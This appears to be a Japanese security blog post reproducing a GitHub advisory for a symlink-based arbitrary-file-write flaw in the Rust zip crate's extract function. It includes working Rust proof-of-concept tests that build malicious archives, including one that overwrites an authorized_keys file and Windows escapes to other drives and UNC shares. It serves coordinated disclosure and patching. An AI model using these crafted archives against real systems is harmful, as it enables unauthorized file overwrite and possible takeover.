---
title: Arbitrary file write outside the extraction directory, because ZipArchive::extract validates symlink targets lexically. (The defense against CVE-2025-29787 was broken in v7.2.0) (GHSA-hjqx-j4rw-g7xv)
description: zip クレートの脆弱性．シンボリックリンクを含む絶対パスの検証が字句的であるため，展開ディレクトリ外への任意ファイル書き込みが可能になる．
date: 2026-10-23 12:12:00 +0900
categories: [CyberSecurity, Bughunt]
tags: [rust, ghsa, arbitrary_file_write]
---

> この脆弱性は `v9.0.0` で修正されました．  
> [Arbitrary file write outside the extraction directory, because ZipArchive::extract validates symlink targets lexically. (The defense against CVE-2025-29787 was broken in v7.2.0) · Advisory · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/security/advisories/GHSA-hjqx-j4rw-g7xv)
{: .prompt-info }

### Summary

- **検証バージョン:** zip `9.0.0-pre3`
- **影響を受けるバージョン:** `7.2.0` 以降
- **前提条件:** 攻撃者が展開先の絶対パスを知っている(または推測できる)こと

シンボリックリンクに対する検証は純粋に字句的なものです．  
その結果，攻撃者はシンボリックリンクを介して展開ディレクトリ外の任意のファイルに書き込むことが可能です．  
悪用には展開先の絶対パスを攻撃者が知っている必要がありますが，CIのワークスペースや `/opt/app`，固定のDownloadsパスなど，悪用される可能性があります．

> **Windowsではさらに影響が拡大します(別ドライブ・UNC共有の両ケースを実機で検証済み)**:  
> `simplified_components` が `Prefix` コンポーネントを破棄するため，`D:\<destと同じ末尾パス>` や，UNCパス `\\attacker\share\<同じ末尾パス>` のようなパスが `starts_with` によるチェックを通過してしまいます．  
> その結果，`outpath.push` によって別のドライブ・リモート共有へと置き換えられてしまうため，**単一のシンボリックリンクのみで十分であり，中間シンボリックリンクのチェーンは不要です**．  
> ただし，Windowsでシンボリックリンクを作成するには `SeCreateSymbolicLinkPrivilege` が必要です(管理者権限，またはDeveloper Modeの有効化)．  
>
> **実機での検証(Windows 10 VM (19045.2604)，`tests/poc_win.rs`)**:  
> 展開先をC:ドライブ配下の一時ディレクトリに設定した状態で，以下の両方のパスにおいて `extract()` が `Ok(())` を返し，展開先の外部への書き込みに成功しました．  
> いずれのケースでも `extract()` はエラーを返さず(`Ok(())`)，`pwned.txt` の内容が攻撃者の指定した値と一致していることを確認しました．

### CVE-2025-29787との関係

本件は既存の [CVE-2025-29787](https://github.com/zip-rs/zip2/security/advisories/GHSA-94vh-gphv-8pm8)(2025年3月)との**重複ではなく**，当該CVE向けに導入された対策が，その後失われたものです．

#### タイムライン(gitの履歴，UTC)

| コミット   | 日付       | 内容                                                                                                                                   |
| ---------- | ---------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| `d4539d6b` | 2025-02-28 | CVE-2025-29787に対する最初の修正です．出力パスおよびシンボリックリンクのターゲットをcanonicalizeし，展開先の配下にあることを検証します |
| `0199ac2c` | 2025-03-15 | **v2.3.0リリース前**に，上記の実装が `simplified_components` による字句的なチェックに置き換えられます                                  |
| `v2.3.0`   | 2025-03-16 | CVEの修正版としてリリースされました．**実際にリリースされたのは字句的なチェックです**                                                  |
| `d5cf4b55` | 2026-01-18 | `simplified_components` における絶対パスの扱いを，**拒否から暗黙的に除去する方式へと変更**しました(v7.2.0でリリース)                   |

#### v2.3.0が影響を受けなかった理由，および対策が失われた経緯

v2.3.0の `safe_prepare_path` は，現行のコードと本質的に同じ字句的チェックを行っています．  
しかし当時の `simplified_components` は，**絶対パスのコンポーネントを含むパスを一律で拒否**していたため，絶対パスのシンボリックリンクターゲットはそもそも受理されず，この攻撃手法は成立しませんでした．

```rust
// v2.3.0: 絶対パスを拒否
Component::Prefix(_) | Component::RootDir => return None,

// 現行: パスが絶対パスであるという情報を無視
Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
```

`d5cf4b55` は，絶対パス名を含むアーカイブを展開可能にすることを意図した変更でしたが，その副作用として**絶対パスのシンボリックリンクターゲットが字句的チェックを通過**するようになってしまい，CVE-2025-29787に対する対策が失われました．

#### 検証

以下の3つのケースを，同一のビルド(`9.0.0-pre3`)を用いて比較しました．

| ペイロード/条件                                                             | 結果                                                                                                               |
| --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| CVE-2025-29787のオリジナルPoC(相対パスのシンボリックリンク `parent -> ../`) | `Err(InvalidArchive("Invalid symlink target path"))` で**ブロックされます**(CVE自体への修正は有効に機能しています) |
| 本レポートのPoC(絶対パスを用いた2段階のシンボリックリンク)                  | `Ok(())` で**成功**し，展開先の外部に書き込まれます                                                                |
| 本レポートのPoCを，`d5cf4b55` の変更を `return None` に戻した状態で実行     | `Err(InvalidArchive("Invalid symlink target path"))` で**ブロックされます**                                        |

1行目は，CVE自体への修正が依然として有効であることを示しており，本レポートが重複でないことを裏付けています．
3行目は，本脆弱性が `d5cf4b55` の変更に起因することを裏付けています．

#### CVE-2025-29787との相違点

- **前提条件がCVEより厳しい:** 本件では展開先の絶対パスを知っている必要があります(`AC:H`)．  
    一方CVEの方は相対パスの `../` のみで成立し，このような前提条件は存在しませんでした．  
- **影響を受けるAPIの範囲がより狭い:** 本件は `ZipArchive::extract`(および `extract_unwrapped_root_dir`)のみに影響します．      `ZipStreamReader::extract` は影響を受けません．  
    これはローカルヘッダの `external_attributes` が `0` であるため，`is_symlink()` が常にfalseを返すためです．

### Details

#### パス文字列に対する字句的な検証

`src/read/zipfile.rs: L290-345` にあるシンボリックリンクの検証は，字句的なものです．

**`src/read/zipfile.rs: fn safe_prepare_path`(L316-321):**

```rust
if !crate::path::simplified_components(&target)
    .ok_or(invalid!("Invalid symlink target path"))?
    .starts_with(
        &crate::path::simplified_components(base_path)
            .ok_or(invalid!("Invalid base path"))?,
    )
```

`simplified_components` は，パスが**絶対パス(ドライブプレフィックス/ルート)であるという情報を破棄**し，字句的に正規化した上で，2つの結果同士の単純なprefix比較を行っています．  
パスが実際にファイルシステム上でどのように解決されるかは一切考慮されていません．

その結果，`..` を用いた古典的な**Zip Slip**攻撃はブロックされますが，シンボリックリンクの解決を伴うパスについては検証されません．

**`src/path.rs: fn simplified_components`(L9-26):**

```rust
/// Simplify a path by removing the prefix and parent directories and only return normal components
pub(crate) fn simplified_components(input: &Path) -> Option<Vec<&OsStr>> {
    let mut out = Vec::new();
    let input_str = input.to_str()?;
    for component in Utf8WindowsPath::new(input_str).components() {
        match component {
            // Skip prefix and root directory components instead of rejecting the entire path
            // This allows extraction of ZIP files with absolute paths, similar to other ZIP tools
            Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
            Utf8WindowsComponent::ParentDir => {
                out.pop()?;
            }
            Utf8WindowsComponent::Normal(s) => out.push(OsStr::new(s)),
            Utf8WindowsComponent::CurDir => (),
        }
    }
    Some(out)
}
```

#### `target` に対する検証の不足

パスチェックを通過した後，**`src/read/zipfile.rs: fn safe_prepare_path`(L345)**で `outpath.push(target)` が実行されますが， **`target` の中間コンポーネントのいずれかがシンボリックリンク自体であるかどうかは一切チェックされません**．

さらに，`extract_internal` から呼び出される `make_symlink` は，内部で `make_symlink_impl` に処理を委譲していますが，そこではアーカイブが指定する `target` が有効なUTF-8であることを検証しているのみです．  
`target` が展開先の内部に収まっているかどうかのチェックは一切存在しないため，シンボリックリンクはそのまま作成されてしまいます．

**`src/read/mod.rs: fn extract_internal`(L396-406):**

```rust
#[cfg(any(unix, windows))]
if file.is_symlink() {
    let mut target = Vec::with_capacity(file.size() as usize);
    file.read_to_end(&mut target)?;
    drop(file);
    make_symlink(&outpath, &target, &self.shared.files)?;
    continue;
} else if file.is_dir() {
    make_writable_dir_all(&outpath)?;
    continue;
}
```

**`src/read/mod.rs: fn make_symlink_impl`(L57-90):**

```rust
#[cfg(unix)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    _existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    std::os::unix::fs::symlink(Path::new(&target_str), outpath)?;
    Ok(())
}

#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));
    let target_is_dir_from_archive =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());
    let target_is_dir = if target_is_dir_from_archive {
        true
    } else if let Ok(meta) = std::fs::metadata(target) {
        meta.is_dir()
    } else {
        false
    };
    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

#### ドキュメントコメントとの矛盾

`src/read/mod.rs: L266-269` にある `extract` のドキュメントコメントには，以下のように記載されています．  
しかし実際には，シンボリックリンク作成時の検証は存在せず，シンボリックリンクのターゲットを検証するために `canonicalize` が使われることはありません(`canonicalize` が使用されているのは `src/read/mod.rs: fn extract_internal`(L357) のみであり，これは展開先ディレクトリ自体を正規化するために使われている)．

```rust
    /// Extract a Zip archive into a directory, overwriting files if they
    /// already exist. Paths are sanitized with [`ZipFile::enclosed_name`]. Symbolic links are only
    /// created and followed if the target is within the destination directory (this is checked
    /// conservatively using [`std::fs::canonicalize`]).
```

以上を組み合わせることで，展開先の外部への書き込みが可能となります．

| エントリ    | 種別               | ターゲット                                                                     |
| ----------- | ------------------ | ------------------------------------------------------------------------------ |
| b           | シンボリックリンク | `/…/outside`(検証なしで作成される)                                             |
| a           | シンボリックリンク | `<dest>/b/sub`(destの配下にあるように字句的には見えるため，チェックを通過する) |
| a/pwned.txt | ファイル           | -                                                                              |

エントリはセントラルディレクトリの順序で処理されるため(`src/read/mod.rs: L386` の `for i in 0..self.len()`)，上記の順序(`b` -> `a` -> `a/pwned.txt`)が必要です．

展開は以下のように進行します．

1. `b`: 検証を一切経ずに，展開先の外部を指すシンボリックリンク `<dest>/b -> /…/outside` が作成されます．
2. `a`: こちらも検証なしに，`<dest>/a -> <dest>/b/sub` が作成されます．
3. `a/pwned.txt`: `safe_prepare_path` がコンポーネント `a` を処理する際，`<dest>/a` がシンボリックリンクであることを検知し，そのターゲット(`<dest>/b/sub`)を検証します．
   - 字句的にはこのターゲットは `<dest>` の配下にあるため，チェックを通過し，`outpath` は `<dest>/b/sub` となります．
   - このとき，**ターゲットの中間コンポーネントである `b` が外部を指すシンボリックリンクになっていることは一切再検証されません**．
   - `a` は最終コンポーネントではないため，`make_writable_dir_all` が呼び出され，`<dest>/b/sub`(実際には `/…/outside/sub`)が作成されます．
4. 最後に `File::create` が `<dest>/b/sub/pwned.txt` を作成しますが，カーネルが `b` を解決するため，実際には `/…/outside/sub/pwned.txt` に書き込まれます．`extract()` は `Ok(())` を返します．

### PoC

以下のPoCはユニットテストとして記述しています．  
`tests/poc_linux.rs` に配置し，`cargo test --test poc_linux -- --nocapture` を実行することで再現できます．

- `zip_slip_via_symlink`: 展開先の外部に新規ファイルを書き込みます
- `overwrite_existing_ssh_authorized_keys`: 展開先の外部にある既存ファイル `~/.ssh/authorized_keys` を上書きします

`tests/poc_linux.rs`

```rust
//! PoC for Linux: Write outside the extraction directory via symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! Mechanism: The symlink target validation is lexical (prefix matching in `simplified_components`)
//! By placing an outward-pointing symlink `b` as an "intermediate component in the resolved path", `b` is traversed by the OS rather than the validation loop, thus escaping outside without being verified.
//! Can be reproduced with `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::{Cursor, Write};
use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Verification of writing a new file outside the extraction destination
#[test]
fn zip_slip_via_symlink() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination
    let outside = tmp.path().join("outside"); // A location where writing should not be allowed
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Symlink pointing outside (target is created unverified)
    zip.add_symlink("b", outside.to_str().unwrap(), opt).unwrap();
    // a: Symlink whose target starts under dest (passes lexical validation)
    zip.add_symlink("a", dest.join("b/sub").to_str().unwrap(), opt).unwrap();
    // a/pwned.txt: File that escapes outside dest by traversing the intermediate b
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    ZipArchive::from(archive).extract(&dest).unwrap();

    // Verification: File has been written outside dest
    let escaped = outside.join("sub/pwned.txt");
    assert!(escaped.exists(), "escape failed");
    assert_eq!(fs::read_to_string(&escaped).unwrap(), "escaped!");
    println!("wrote outside dest: {}", escaped.display());
}

/// Verification of overwriting an existing file (~/.ssh/authorized_keys) outside the extraction destination
#[test]
fn overwrite_existing_ssh_authorized_keys() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination

    // Reproduce victim's existing ~/.ssh/authorized_keys (containing a legitimate key)
    let home = tmp.path().join("home_victim");
    let ssh = home.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let authorized_keys = ssh.join("authorized_keys");
    fs::write(&authorized_keys, "ssh-ed25519 AAAA...LEGIT victim@host\n").unwrap();
    let original = fs::read_to_string(&authorized_keys).unwrap();

    fs::create_dir(&dest).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Outward-pointing symlink to victim's HOME (target unverified)
    // Because it's placed in the middle rather than at the end, the OS traverses it transparently, bypassing validation
    zip.add_symlink("b", home.to_str().unwrap(), opt).unwrap();
    // a: Symlink pointing to <dest>/b/.ssh (passes validation because it is lexically under dest)
    zip.add_symlink("a", dest.join("b/.ssh").to_str().unwrap(), opt).unwrap();
    // a/authorized_keys: File entry that reaches the actual authorized_keys
    zip.start_file("a/authorized_keys", opt).unwrap();
    zip.write_all(b"ssh-ed25519 AAAA...ATTACKER attacker@evil\n").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    // extract() returns Ok(()) without an error (the caller cannot detect it)
    let res = ZipArchive::from(archive).extract(&dest);
    println!("extract() returned: {:?}", res);
    res.unwrap();

    // Verification: Existing file is overwritten with the attacker's content
    let after = fs::read_to_string(&authorized_keys).unwrap();
    println!("--- BEFORE ---\n{original}--- AFTER ---\n{after}");
    assert_ne!(after, original, "file was NOT overwritten");
    assert!(after.contains("ATTACKER"), "attacker content not present");
    println!("OVERWROTE existing file: {}", authorized_keys.display());
}
```

#### Windows向けPoC(`tests/poc_win.rs`)

これはWindows固有の，**単一のシンボリックリンクによる別ドライブ・UNC共有への脱出**を検証するテストです．  
展開先を C:ドライブ上の一時ディレクトリに設定した上で，シンボリックリンクのターゲットを**destと同じ末尾パスを持つ別ボリューム上の絶対パス**とすることで，(`Prefix` を破棄) `simplified_components` による字句チェックを通過し，`outpath.push` によるドライブ/共有の置き換えによって，`dest` の外部への書き込みが発生します．

- `escape_via_second_drive`: 別ドライブ(例: `E:`)上の `E:\<destと同じ末尾パス>\evil\pwned.txt` に書き込みます
- `escape_via_unc_share`: UNC共有(例: `\\localhost\poc\`)上の `\\localhost\poc\<destと同じ末尾パス>\evil\pwned.txt` に書き込みます

````rust
//! Windows PoC: writing to a separate drive / UNC share via a single symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! The crafted ZIP contains only 2 entries:
//!   1. `a`          : a symlink whose target = `<OTHER>\<same tail as dest>\evil` (absolute path)
//!   2. `a/pwned.txt`: a regular file
//! During extraction, resolving `a` causes outpath to be replaced with `<OTHER>\...\evil`,
//! and `File::create(<OTHER>\...\evil\pwned.txt)` writes outside of dest.
//!
//! # Prerequisites
//! - Windows 10 (build 14972+) through Windows 11
//! - Symlink creation privilege `SeCreateSymbolicLinkPrivilege` = Developer Mode enabled, or run as Administrator.
//! - One volume / share **separate from dest**.
//!   Supply the escape destination via environment variables:
//!     * `POC_OTHER_DRIVE`: root of a separate drive. Must end with `\`. e.g. `D:\`
//!     * `POC_UNC_SHARE`: root of a writable UNC share. Must end with `\`.
//!       e.g. `\\localhost\poc\`
//!       (`net share poc=C:\path\to\share /grant:%USERNAME%,FULL`)
//!
//! # Running
//!
//! ```powershell
//! $env:POC_OTHER_DRIVE = "D:\"
//! $env:POC_UNC_SHARE   = "\\localhost\poc\"
//! cargo test --test poc_win -- --nocapture
//! ```

#![cfg(windows)]

use std::ffi::OsString;
use std::fs;
use std::io::{Cursor, Write};
use std::path::{Component, Path, PathBuf};

use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Whether we have the privilege needed to create symlinks
fn have_symlink_privilege() -> bool {
    let Ok(tmp) = TempDir::new() else {
        return false;
    };
    let target = tmp.path().join("privcheck_target");
    let link = tmp.path().join("privcheck_link");
    if fs::write(&target, b"x").is_err() {
        return false;
    }
    std::os::windows::fs::symlink_file(&target, &link).is_ok()
}

/// Extract only the Normal components of a path (the tail, with prefix / root dropped)
fn normal_tail(p: &Path) -> Vec<OsString> {
    p.components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_os_string()),
            _ => None,
        })
        .collect()
}

/// Returns the `Prefix` (volume identifier) at the head of the path
fn volume_prefix(p: &Path) -> Option<OsString> {
    match p.components().next() {
        Some(Component::Prefix(pre)) => Some(pre.as_os_str().to_os_string()),
        _ => None,
    }
}

/// Verifies the single-symlink escape using the escape destination root `other_root` (a separate volume / share)
fn run_escape(variant: &str, other_root: &str) {
    if !have_symlink_privilege() {
        eprintln!(
            "[SKIP] [{variant}] missing SeCreateSymbolicLinkPrivilege; \
             enable Developer Mode or run as Administrator."
        );
        return;
    }

    // other_root must be an existing, writable root
    let other_root_path = PathBuf::from(other_root);
    if !fs::metadata(&other_root_path)
        .map(|m| m.is_dir())
        .unwrap_or(false)
    {
        eprintln!(
            "[SKIP] [{variant}] escape root {other_root:?} does not exist or is not a \
             directory; check the environment variable."
        );
        return;
    }

    // The extraction destination `dest` is a temp directory (usually on C:). Since the `base` used by
    // safe_prepare_path is the path after canonicalize, match the tail to that.
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest");
    fs::create_dir(&dest).unwrap();
    let canon_dest = fs::canonicalize(&dest).unwrap();
    let tail = normal_tail(&canon_dest);

    // Reproduce dest's tail on a separate volume as the escape destination, with evil/ underneath it.
    // Since simplified_components discards the prefix, the target's tail component sequence
    // prefix-matches the base's tail component sequence, passing the lexical check.
    let mut escape_dir = other_root_path.clone();
    for c in &tail {
        escape_dir.push(c);
    }
    escape_dir.push("evil");

    // Confirm it's actually a separate volume (if it's the same volume, it would land inside dest and not be an escape)
    let other_vol = fs::canonicalize(&other_root_path)
        .ok()
        .and_then(|p| volume_prefix(&p));
    let dest_vol = volume_prefix(&canon_dest);
    assert_ne!(
        other_vol, dest_vol,
        "[{variant}] escape root {other_root:?} is on the same volume as dest; \
         point it at a different drive/share (dest vol={dest_vol:?})."
    );

    // Assemble the crafted ZIP (entries: 1 symlink + 1 file)
    let target_str = escape_dir
        .to_str()
        .expect("escape path must be valid UTF-8")
        .to_string();
    println!("[{variant}] dest (canonical) = {}", canon_dest.display());
    println!("[{variant}] symlink target   = {target_str}");

    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // a: an absolute symlink pointing to the separate drive/share (passes the lexical check via matching tail)
    zip.add_symlink("a", &target_str, opt).unwrap();
    // a/pwned.txt: resolving `a` substitutes the drive in outpath, causing the write to land outside dest
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped-on-windows!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    let res = ZipArchive::from(archive).extract(&dest);
    println!("[{variant}] extract() returned: {res:?}");

    res.expect("extract() failed");

    let escaped = escape_dir.join("pwned.txt");
    assert!(
        escaped.exists(),
        "[{variant}] escape failed: {} was not created",
        escaped.display()
    );

    let content = fs::read_to_string(&escaped).unwrap();
    println!(
        "[{variant}] WROTE OUTSIDE DEST: {} = {content:?}",
        escaped.display()
    );

    let _ = fs::remove_file(&escaped);
    let _ = fs::remove_dir(&escape_dir);

    assert_eq!(
        content, "escaped-on-windows!",
        "[{variant}] written content mismatch",
    );
}

/// Single-symlink escape to a separate drive (`POC_OTHER_DRIVE`, e.g. `D:\`)
#[test]
fn escape_via_second_drive() {
    match std::env::var("POC_OTHER_DRIVE") {
        Ok(root) if !root.is_empty() => run_escape("drive", &root),
        _ => eprintln!(
            "[SKIP] escape_via_second_drive: POC_OTHER_DRIVE not set \
             (PowerShell: `$env:POC_OTHER_DRIVE=\"D:\\\"`)."
        ),
    }
}

/// Single-symlink escape to a UNC share (`POC_UNC_SHARE`, e.g. `\\localhost\poc\`)
#[test]
fn escape_via_unc_share() {
    match std::env::var("POC_UNC_SHARE") {
        Ok(root) if !root.is_empty() => run_escape("unc", &root),
        _ => eprintln!(
            "[SKIP] escape_via_unc_share: POC_UNC_SHARE not set \
             (PowerShell: `$env:POC_UNC_SHARE=\"\\\\localhost\\poc\\\"`)."
        ),
    }
}
````

### Impact

信頼できないZIPアーカイブを `ZipArchive::extract` / `ZipArchive::extract_unwrapped_root_dir` を用いて展開するプロセスの権限で，攻撃者は**展開ディレクトリの外部にある任意のパスへ，任意の内容のファイルを書き込む**ことが可能です．

- 既存のファイルを上書きできるため，`~/.ssh/authorized_keys`，`~/.bashrc`，`.git/hooks/*`，CI設定，あるいはサービスのバイナリや設定ファイルを改ざんすることで，**リモートコード実行や権限昇格につながる可能性があります**．  
  重要なファイルの破壊はサービス拒否(DoS)を引き起こすこともあります．
- 展開は**失敗せず `Ok(())` を返す**ため，呼び出し側には攻撃を検知する単純な手段がありません．
- `extract()` のドキュメントには，**シンボリックリンクは，ターゲットが展開先ディレクトリの内部にある場合にのみ作成・追従される**と明記されているため，これをサンドボックスの境界として依拠している下流のアプリケーションは直接的な影響を受けます．

悪用には展開先の絶対パスを知っている必要がありますが，これは実際に悪用可能な条件です．  
CIのワークスペースや `/opt/<app>`，固定のDownloadsディレクトリなどが該当します．
